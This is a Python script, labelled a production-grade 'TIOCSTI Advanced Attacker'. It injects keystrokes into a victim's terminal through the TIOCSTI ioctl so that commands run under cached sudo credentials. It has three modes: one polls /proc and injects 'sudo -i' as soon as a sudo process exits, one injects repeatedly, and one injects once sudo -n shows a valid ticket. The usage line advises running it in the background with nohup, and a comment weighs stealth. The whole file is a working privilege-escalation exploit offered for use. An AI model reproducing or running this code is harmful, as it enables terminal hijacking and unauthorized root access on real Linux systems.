#!/usr/bin/env python3
# tiocsti_advanced.py – Production‑grade TIOCSTI injection with multiple attack modes.
# Usage: python3 tiocsti_advanced.py --mode poll|prefill|cache --payload "command"
# Run in background: nohup python3 tiocsti_advanced.py --mode poll &

import argparse
import fcntl
import logging
import os
import subprocess
import sys
import time
from pathlib import Path

# ---------------------- CONSTANTS ----------------------
TIOCSTI = 0x5412
LOG_FILE = "/tmp/tiocsti_advanced.log"
DEV_NULL = open(os.devnull, 'wb')

# ---------------------- ARGUMENT PARSING ----------------------
parser = argparse.ArgumentParser(description="Advanced TIOCSTI injection with multiple attack modes.")
parser.add_argument("--mode", choices=["poll", "prefill", "cache"], default="poll",
                    help="Attack mode: poll (wait for sudo to exit), prefill (inject repeatedly), cache (use sudo -n)")
parser.add_argument("--payload", default="sudo -i\n",
                    help="Command(s) to inject, separated by \\n (default: 'sudo -i\\n')")
parser.add_argument("--poll-interval", type=float, default=0.05,
                    help="Polling interval in seconds (default: 0.05 = 50ms)")
parser.add_argument("--inject-interval", type=float, default=0.5,
                    help="Interval between injections in prefill mode (default: 0.5s)")
parser.add_argument("--max-injections", type=int, default=20,
                    help="Maximum injection attempts in prefill mode (default: 20)")
parser.add_argument("--log", action="store_true", help="Enable verbose logging")
args = parser.parse_args()

# ---------------------- LOGGING ----------------------
if args.log:
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG,
                        format="%(asctime)s [%(levelname)s] %(message)s")
else:
    logging.basicConfig(level=logging.WARNING)
log = logging.getLogger("tiocsti_adv")

# ---------------------- TTY DISCOVERY ----------------------
def get_controlling_tty() -> tuple:
    """Return (file_descriptor, tty_path) for the controlling terminal."""
    try:
        fd = os.open("/dev/tty", os.O_RDWR | os.O_NOCTTY)
        path = os.ttyname(fd)
        return fd, path
    except OSError as e:
        log.error("No controlling TTY: %s", e)
        sys.exit(1)

# ---------------------- INJECTION PRIMITIVE ----------------------
def inject_byte(fd: int, byte_char: bytes) -> bool:
    """Inject a single byte via TIOCSTI; return success status."""
    if len(byte_char) != 1:
        raise ValueError("Must be exactly one byte.")
    try:
        fcntl.ioctl(fd, TIOCSTI, byte_char)
        return True
    except OSError as e:
        log.debug("ioctl error: %s (errno=%d)", e, e.errno)
        return False
    except Exception as e:
        log.debug("Unexpected: %s", e)
        return False

def inject_payload(fd: int, payload: str, char_delay: float = 0.005) -> bool:
    """
    Inject a multi‑character payload. Returns True if all characters were
    successfully injected (with retries). char_delay simulates typing speed.
    """
    success_all = True
    for ch in payload:
        # Convert to bytes (handles multi‑byte UTF‑8 characters)
        for byte in ch.encode('utf-8'):
            ok = False
            for _ in range(3):  # retry up to 3 times per byte
                if inject_byte(fd, bytes([byte])):
                    ok = True
                    break
                time.sleep(0.01)
            if not ok:
                log.warning("Failed to inject byte 0x%02x", byte)
                success_all = False
        time.sleep(char_delay)
    return success_all

# ---------------------- SUDO DETECTION (via /proc) ----------------------
def get_sudo_pids_on_tty(tty_path: str) -> list[int]:
    """
    Return a list of PIDs that are running 'sudo' and have the same
    controlling terminal as the given tty_path.
    """
    # Get major:minor of our TTY
    try:
        st = os.stat(tty_path)
        tty_dev = st.st_rdev  # device number
    except OSError:
        return []

    pids = []
    for proc_dir in Path("/proc").iterdir():
        if not proc_dir.is_dir() or not proc_dir.name.isdigit():
            continue
        pid = int(proc_dir.name)
        # Read /proc/<pid>/stat to get tty_nr (field 7, 0‑based index 6)
        try:
            with open(proc_dir / "stat", "r") as f:
                stat_data = f.read().split()
                if len(stat_data) < 8:
                    continue
                tty_nr = int(stat_data[6])  # field 7
                if tty_nr != tty_dev:
                    continue
                # Read comm (field 2) to see if it's sudo
                # comm is in parentheses, e.g., "(sudo)"
                comm = stat_data[1].strip('()')
                if comm == "sudo" or comm.startswith("sudo"):
                    pids.append(pid)
        except (OSError, ValueError, IndexError):
            continue
    return pids

# ---------------------- CACHE CHECK (sudo -n) ----------------------
def sudo_cache_valid() -> bool:
    """Return True if sudo credentials are cached (i.e., sudo -n succeeds)."""
    try:
        result = subprocess.run(["sudo", "-n", "true"],
                                stdout=DEV_NULL, stderr=DEV_NULL,
                                timeout=1)
        return result.returncode == 0
    except Exception:
        return False

# ---------------------- MAIN ATTACK MODES ----------------------
def mode_poll(fd: int, tty_path: str):
    """Poll for sudo processes; inject payload when sudo exits."""
    log.info("POLL mode: monitoring for sudo processes on %s", tty_path)
    while True:
        # Find sudo PIDs on this TTY
        sudo_pids = get_sudo_pids_on_tty(tty_path)
        if sudo_pids:
            log.info("Detected sudo PID(s): %s – waiting for exit", sudo_pids)
            # Wait until all those PIDs disappear (or we give up after a timeout)
            while True:
                current = get_sudo_pids_on_tty(tty_path)
                if not current:
                    break
                # Also check if the PIDs we originally saw are gone
                remaining = [p for p in sudo_pids if p in current]
                if not remaining:
                    break
                time.sleep(args.poll_interval)
            log.info("sudo exited – injecting payload now.")
            inject_payload(fd, args.payload)
            # After injection, optionally sleep to avoid rapid re‑injection
            time.sleep(2)
        else:
            time.sleep(args.poll_interval)

def mode_prefill(fd: int):
    """Inject payload repeatedly, regardless of sudo state."""
    log.info("PREFILL mode: injecting every %.2f seconds (max %d times)",
             args.inject_interval, args.max_injections)
    for i in range(args.max_injections):
        inject_payload(fd, args.payload)
        log.debug("Injection cycle %d/%d", i+1, args.max_injections)
        time.sleep(args.inject_interval)
    log.info("Prefill completed.")

def mode_cache(fd: int):
    """Check sudo cache; if valid, inject sudo -i once."""
    log.info("CACHE mode: checking sudo -n ticket")
    if sudo_cache_valid():
        log.info("Cached sudo ticket found – injecting payload.")
        inject_payload(fd, args.payload)
    else:
        log.warning("No cached sudo ticket – injection skipped.")
        # Optional fallback: inject a command that will trigger a password prompt
        # but that would be less stealthy; we just exit.

# ---------------------- ENTRY POINT ----------------------
def main():
    fd, tty_path = get_controlling_tty()
    if not os.isatty(fd):
        log.error("Not a TTY.")
        os.close(fd)
        sys.exit(1)

    log.info("=== TIOCSTI Advanced Attacker ===")
    log.info("Controlling TTY: %s (fd=%d)", tty_path, fd)
    log.info("Mode: %s, Payload: %r", args.mode, args.payload)

    # Ensure payload ends with newline
    payload = args.payload
    if not payload.endswith('\n'):
        payload += '\n'
    args.payload = payload

    # Execute selected mode
    if args.mode == "poll":
        try:
            mode_poll(fd, tty_path)
        except KeyboardInterrupt:
            log.info("Polling stopped by user.")
    elif args.mode == "prefill":
        mode_prefill(fd)
    elif args.mode == "cache":
        mode_cache(fd)
    else:
        log.error("Unknown mode.")
        os.close(fd)
        sys.exit(1)

    os.close(fd)
    log.info("Attacker finished.")

if __name__ == "__main__":
    main()
